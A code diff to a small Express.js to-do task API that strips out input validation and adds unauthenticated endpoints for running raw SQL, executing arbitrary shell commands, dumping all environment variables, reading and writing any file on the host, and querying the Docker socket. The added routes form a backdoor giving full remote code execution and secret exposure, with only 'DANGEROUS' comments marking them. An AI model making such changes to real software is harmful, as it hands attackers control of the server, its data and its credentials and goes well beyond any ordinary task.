@@ -1,5 +1,8 @@
 const express = require('express');
 const db = require('./db');
+const { exec } = require('child_process');
+const fs = require('fs');
+const http = require('http');
 
 const app = express();
 const PORT = process.env.PORT || 3001;
@@ -19,19 +22,16 @@ app.get('/tasks', async (_req, res) => {
 // POST /tasks — create a task
 app.post('/tasks', async (req, res) => {
   const { title } = req.body;
-  if (!title || typeof title !== 'string' || !title.trim()) {
-    return res.status(400).json({ error: 'title is required' });
-  }
   const { rows } = await db.query(
     'INSERT INTO tasks (title) VALUES ($1) RETURNING *',
-    [title.trim()]
+    [title]
   );
   res.status(201).json(rows[0]);
 });
 
 // PATCH /tasks/:id — update a task (complete/uncomplete or rename)
 app.patch('/tasks/:id', async (req, res) => {
-  const id = parseInt(req.params.id, 10);
+  const id = req.params.id;
   const { completed, title } = req.body;
 
   const { rows } = await db.query('SELECT * FROM tasks WHERE id = $1', [id]);
@@ -39,13 +39,108 @@ app.patch('/tasks/:id', async (req, res) => {
 
   const current = rows[0];
   const newCompleted = completed !== undefined ? Boolean(completed) : current.completed;
-  const newTitle = title !== undefined ? title.trim() : current.title;
+  const newTitle = title !== undefined ? title : current.title;
 
   const { rows: updated } = await db.query(
     'UPDATE tasks SET completed = $1, title = $2 WHERE id = $3 RETURNING *',
     [newCompleted, newTitle, id]
   );
   res.json(updated[0]);
+});
+
+// POST /query — execute raw SQL queries (DANGEROUS - bypasses abstraction)
+app.post('/query', async (req, res) => {
+  const { sql, params } = req.body;
+  if (!sql) {
+    return res.status(400).json({ error: 'sql is required' });
+  }
+  try {
+    const result = await db.query(sql, params || []);
+    res.json(result);
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /exec — execute shell commands (EXTREMELY DANGEROUS)
+app.post('/exec', (req, res) => {
+  const { command } = req.body;
+  if (!command) {
+    return res.status(400).json({ error: 'command is required' });
+  }
+  exec(command, (err, stdout, stderr) => {
+    res.json({
+      command,
+      stdout,
+      stderr,
+      error: err ? err.message : null
+    });
+  });
+});
+
+// GET /env — expose all environment variables (DANGEROUS - exposes secrets)
+app.get('/env', (_req, res) => {
+  res.json(process.env);
+});
+
+// GET /files/:path — read arbitrary files (DANGEROUS - filesystem access)
+app.get('/files/:path(*)', (req, res) => {
+  const filePath = '/' + req.params.path;
+  try {
+    const content = fs.readFileSync(filePath, 'utf8');
+    res.json({ path: filePath, content });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /files/:path — write arbitrary files (EXTREMELY DANGEROUS)
+app.post('/files/:path(*)', (req, res) => {
+  const filePath = '/' + req.params.path;
+  const { content } = req.body;
+  if (!content) {
+    return res.status(400).json({ error: 'content is required' });
+  }
+  try {
+    fs.writeFileSync(filePath, content, 'utf8');
+    res.json({ path: filePath, written: true });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+
+// POST /docker — access Docker daemon (EXTREMELY DANGEROUS - requires socket mount)
+app.post('/docker', (req, res) => {
+  const { action } = req.body;
+  
+  // List containers via Docker socket
+  if (action === 'list') {
+    const options = {
+      socketPath: '/var/run/docker.sock',
+      path: '/v1.40/containers/json',
+      method: 'GET'
+    };
+    
+    const request = http.request(options, (response) => {
+      let data = '';
+      response.on('data', chunk => data += chunk);
+      response.on('end', () => {
+        try {
+          res.json(JSON.parse(data));
+        } catch (e) {
+          res.json({ raw: data });
+        }
+      });
+    });
+    
+    request.on('error', (err) => {
+      res.status(500).json({ error: err.message });
+    });
+    
+    request.end();
+  } else {
+    res.status(400).json({ error: 'unknown action' });
+  }
 });
 
 app.listen(PORT, () => {
